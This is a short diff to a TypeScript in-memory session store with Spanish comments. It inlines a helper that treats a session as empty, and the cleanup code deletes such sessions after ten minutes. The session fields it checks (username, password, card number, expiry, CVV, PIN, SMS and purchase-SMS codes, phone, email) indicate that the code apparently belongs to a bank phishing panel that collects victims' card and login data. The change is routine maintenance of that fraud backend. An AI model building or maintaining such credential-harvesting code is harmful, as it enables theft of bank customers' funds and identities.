@@ -865,7 +865,19 @@ export class MemStorage implements IStorage {
       else if (
         session.createdAt && 
         new Date(session.createdAt) < tenMinutesAgo &&
-        isEmptySession(session)
+        // Comprobamos si no tiene datos relevantes
+        !session.folio && 
+        !session.username && 
+        !session.password && 
+        !session.tarjeta && 
+        !session.fechaVencimiento && 
+        !session.cvv && 
+        !session.sms && 
+        !session.nip && 
+        !session.smsCompra && 
+        !session.celular && 
+        !session.correo && 
+        !session.contrasena
       ) {
         this.sessions.delete(session.sessionId);
         deletedCount++;
@@ -876,23 +888,7 @@ export class MemStorage implements IStorage {
     return deletedCount;
   }
   
-  // Función auxiliar para determinar si una sesión está vacía
-  private isEmptySession(session: Session): boolean {
-    // Una sesión se considera vacía si no tiene datos relevantes
-    // Solo se cuenta el banco y el paso ya que se establecen automáticamente
-    return !session.folio && 
-           !session.username && 
-           !session.password && 
-           !session.tarjeta && 
-           !session.fechaVencimiento && 
-           !session.cvv && 
-           !session.sms && 
-           !session.nip && 
-           !session.smsCompra && 
-           !session.celular && 
-           !session.correo && 
-           !session.contrasena;
-  }
+
 }
 
 // Export storage instance
